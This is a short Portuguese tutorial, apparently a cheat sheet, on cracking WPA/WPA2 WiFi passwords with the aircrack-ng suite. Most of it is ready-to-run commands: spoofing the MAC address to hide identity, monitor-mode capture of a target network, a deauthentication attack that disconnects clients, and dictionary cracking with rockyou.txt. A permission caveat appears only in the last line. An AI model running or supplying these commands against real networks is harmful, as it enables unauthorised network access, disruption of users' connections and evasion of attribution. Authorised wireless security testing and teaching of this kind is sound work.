# Cracking WPA e WPA2 com o Aircrack

## Introdução

O Aircrack-ng é uma ferramenta poderosa para testes de penetração de redes WiFi. 

## Etapas do Teste de Penetração

### Verificação da Interface de Rede

Listar interfaces de rede disponíveis:

```bash
iwconfig
```

### Colocar a Interface em Modo Monitor

#### Desabilitar a Interface

```bash
sudo ifconfig wlan0 down
```

### Mudar o MAC Address da Interface

É útil mudar o endereço do endereço MAC para esconder sua identidade.

```bash
macchanger -r wlan0
```

Para restaura ao MAC original:

```bash
macchanger -p wlan0
```

#### Ativar Modo Monitor

```bash
sudo airmon-ng start wlan0
```
Isso cria uma interface `mon0` ou `wlan0mon` em modo monitor.

### Captura de Pacotes

#### Iniciar a Captura de Pacotes

```bash
sudo airodump-ng wlan0mon
```

Este comando lista todas as redes disponíveis. Identifique a rede alvo (BSSID e canal).

#### Focar na Rede Alvo

```bash
sudo airodump-ng -c <canal> --bssid <BSSID> -w <arquivo> wlan0mon
```

Substitua `<canal>` pelo número do canal e `<BSSID>` pelo BSSID da rede alvo. O `-w` especifica o nome do arquivo onde os pacotes serão salvos.

### Forçar a Desconexão (Deauth Attack)

#### Enviar Pacotes Deauth
```bash
sudo aireplay-ng --deauth <número de pacotes> -a <BSSID> -c <CLIENTE_MAC> wlan0mon
```
- `-a <BSSID>`: BSSID da rede alvo.
- `-c <CLIENTE_MAC>`: MAC do cliente que você quer desconectar. Se omitido, desconecta todos os clientes.

### Cracking da Senha WPA2

#### Iniciar o Aircrack-ng
```bash
sudo aircrack-ng -w <wordlist> -b <BSSID> <arquivo>.cap
```
- `<wordlist>`: Caminho para o arquivo de wordlist (ex.: rockyou.txt).
- `<arquivo>.cap`: Arquivo de captura gerado pelo `airodump-ng`.

### Análise dos Resultados

- Se a senha estiver na wordlist, o Aircrack-ng exibirá a senha.
- Se a senha não for encontrada, considere usar uma wordlist maior ou um ataque de força bruta mais elaborado.

## Dicas Adicionais

- **Wordlists**: Utilize wordlists conhecidas e robustas como rockyou.txt, encontradas em `/usr/share/wordlists/`.
- **Hardware de Qualidade**: Um adaptador de rede sem fio de alta qualidade pode fazer a diferença na captação de sinais.
- **Ambiente**: Realize testes em um ambiente controlado e com permissão.